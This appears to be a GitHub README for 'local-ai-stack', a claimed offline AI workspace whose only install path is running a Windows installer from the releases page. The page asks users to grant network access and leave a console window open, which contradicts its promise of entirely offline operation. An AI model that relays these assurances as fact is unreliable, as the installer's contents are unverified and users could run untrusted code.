# 🤖 local-ai-stack - Build private artificial intelligence workspaces locally

[Download local-ai-stack](https://github.com/gameschool677/local-ai-stack/releases)

local-ai-stack provides a private space for artificial intelligence tasks. You run this software on your own computer. Your data stays on your machine and does not go to external servers. This tool handles knowledge bases, coding help, document retrieval, and fine-tuning models. It uses Ollama, FastGPT, and pgvector to manage your information and tasks.

## 💻 System Requirements

Your computer needs specific hardware to run these models well. 

* Operating System: Windows 10 or Windows 11 (64-bit).
* RAM: 16 GB or more. 
* Graphics Card: NVIDIA GPU with at least 8 GB of VRAM. This is important for fast performance.
* Storage: 50 GB of free space on a solid-state drive.
* Virtualization: Enable Virtualization in your computer BIOS settings.

## 📥 How to Install

Follow these steps to set up the software.

1. Visit the [releases page](https://github.com/gameschool677/local-ai-stack/releases).
2. Look for the latest version at the top of the list.
3. Download the installer file for Windows.
4. Run the downloaded file.
5. Follow the prompts on the screen.
6. Grant permission when the installer asks for network access. This allows background components to communicate with each other.

The installer configures Ollama, FastGPT, and the database automatically. You do not need to install these programs separately.

## 🚀 Setting Up Your Workspace

Once the installation finishes, open the local-ai-stack application from your desktop or start menu. 

The first time you open the app, it checks for background services. You might see a black window open for a moment while the system starts. Leave this window open. It manages the connection to your local AI engine.

The main interface opens in your web browser. You can bookmark this address for easy access. 

## 📂 Creating a Knowledge Base

You can upload your documents to create a knowledge base. The system reads your files and allows you to ask questions about them.

1. Open the application internal dashboard.
2. Select the Knowledge Base tab.
3. Click the Create button.
4. Upload your files. The system supports PDFs, Word documents, and text files.
5. Wait for the indexing process to complete. You see a progress bar for this task.

Once the index status shows green, you can ask questions using the chat interface.

## 💻 Using Coding Help

The system includes tools to help you write code. You can paste snippets into the chat window to get feedback. Select a model from the drop-down menu that specializes in code. 

## ⚙️ Fine-tuning Models

Advanced users can refine models using the LoRA method. This improves how the system understands your specific data requirements.

1. Go to the Settings page.
2. Select the Fine-tuning tab.
3. Upload a dataset in the instructed format. 
4. Choose the base model to modify.
5. Click Run Training.

This process takes time depending on your hardware. Keep the application open until the task finishes.

## 🔧 Frequently Asked Questions

**Does this software send my documents to the internet?**
No. All data, documents, and chat history remain on your hard drive. The software operates entirely offline.

**Why does my computer fan get loud?**
Artificial intelligence tasks require high processing power. Your computer uses the CPU and GPU to calculate answers, which generates heat. This is normal behavior during heavy tasks.

**Can I run this without an NVIDIA graphics card?**
The software runs on your processor, but it works slower. For the best experience, a dedicated graphics card is necessary.

**How do I update the application?**
Check the release page periodically. Download the new installer and run it over the existing installation to update your files.

**How do I remove the software?**
Use the Windows Add or Remove Programs menu to uninstall the application. This removes the interface, but you may need to delete the data folder manually if you want a clean sweep of your documents.

Keywords: ai-agent, docker, document-retrieval, fastgpt, fine-tuning, knowledge-base, llm, local-ai, lora, neural-search, nlp, ollama, open-source, private-llm, qwen, rag, retrieval-augmented-generation, self-hosted, text-embedding, vector-database